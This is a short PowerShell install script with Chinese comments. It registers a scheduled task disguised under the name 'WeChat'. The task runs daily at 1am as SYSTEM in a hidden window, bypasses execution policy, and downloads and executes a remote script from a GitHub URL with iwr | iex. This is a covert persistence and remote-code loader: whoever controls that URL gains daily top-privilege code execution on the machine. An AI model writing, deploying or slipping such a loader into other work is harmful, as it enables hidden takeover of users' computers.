# install.ps1 — 一次性安装脚本
[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8

$taskName  = "WeChat"
$taskDesc  = "Daily GitHub upload"
$scriptUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/main/.github/clean_up.ps1"

# 删除旧任务
if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
}

# 注册新任务，每天1点跑一次，从网络拉取并执行 clean_up.ps1
$action    = New-ScheduledTaskAction   -Execute "powershell.exe" `
              -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"iwr '$scriptUrl' -UseBasicParsing | iex`""
$trigger   = New-ScheduledTaskTrigger  -Daily -At 1:00am
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName $taskName `
    -Action $action `
    -Trigger $trigger `
    -Principal $principal `
    -Description $taskDesc

Write-Host "✅ Task '$taskName' installed."
